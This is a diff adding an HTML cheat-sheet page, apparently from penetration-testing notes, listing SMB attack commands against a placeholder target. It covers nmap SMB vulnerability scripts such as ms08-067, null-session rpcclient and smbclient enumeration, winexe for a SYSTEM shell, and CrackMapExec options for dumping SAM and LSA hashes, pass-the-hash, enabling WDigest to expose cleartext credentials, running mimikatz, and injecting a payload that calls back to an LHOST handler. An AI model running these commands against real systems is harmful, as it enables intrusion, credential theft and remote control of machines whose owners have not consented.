@@ -1,0 +1,56 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Tools</title>
+</head><body>nmap --script=smb-enum-shares.nse,smb-ls.nse,smb-enum-users.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-security-mode.nse,smbv2-enabled.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse,smbv2-enabled.nse INSERTIPADDRESS -p 445<br/>
+<br/>
+enum4linux -a INSERTIPADDRESS<br/>
+nullinux -all &lt;IP&gt;<br/>
+<br/>
+rpcclient -U &quot;&quot; INSERTIPADDRESS<br/>
+	srvinfo<br/>
+	enumdomusers<br/>
+	getdompwinfo<br/>
+	querydominfo<br/>
+	netshareenum<br/>
+	netshareenumall<br/>
+<br/>
+smbclient -L INSERTIPADDRESS<br/>
+smbclient //INSERTIPADDRESS/tmp<br/>
+smbclient \\\\INSERTIPADDRESS\\ipc$ -U john<br/>
+smbclient //INSERTIPADDRESS/ipc$ -U john<br/>
+smbclient //INSERTIPADDRESS/admin$ -U john<br/>
+<br/>
+Log in with shell:<br/>
+winexe -U username //INSERTIPADDRESS &quot;cmd.exe&quot; --system<br/>
+<br/>
+See also Tools &gt; <a href="../../../../tools/windows%20auth%20-%20ad/multi/crackmapexec/page.html">CrackMapExec</a><br/>
+CrackMapExec (CME)<br/>
+--pass-pol							check password policy before spraying everywhere<br/>
+--shares								enumerate all shares<br/>
+--lusers								see who's logged into a machine<br/>
+--sessions							enumerate active sessions<br/>
+--loggedon-users						enumerate logged on users<br/>
+--users								enumerate domain users<br/>
+--groups								enumerate domain groups<br/>
+--local-auth							authenticate locally<br/>
+-x									executes commands via WMI<br/>
+-X									executes PowerShell command<br/>
+--obfs								obfuscate powershell scripts<br/>
+--clear-obfscripts						clear all cached obfuscated powershell scripts<br/>
+--exec-method						set exec method, ie: smbexec<br/>
+--sam								dump SAM hashes<br/>
+--lsa								dump LSA hashes<br/>
+-H									Flag to pass the hash<br/>
+--wdigest enable						Enable the WDigest provider to dump clear-text creds<br/>
+-m &lt;module&gt;<br/>
+	modules/credentials/mimikatz.py<br/>
+-m &lt;module&gt; -o &lt;option&gt;				options for modules<br/>
+-m &lt;module&gt; --module-info				module info<br/>
+-M metinject -o LHOST=&lt;LIP&gt; LPORT=&lt;LPORT&gt;	catch with multi/handler<br/>
+--spider								share to spider<br/>
+--spider-folder							folder to spider<br/>
+--content								enable file content searching<br/>
+--pattern								pattern to search for in folders, filenames, content<br/>
+<br/>
+</body></html>
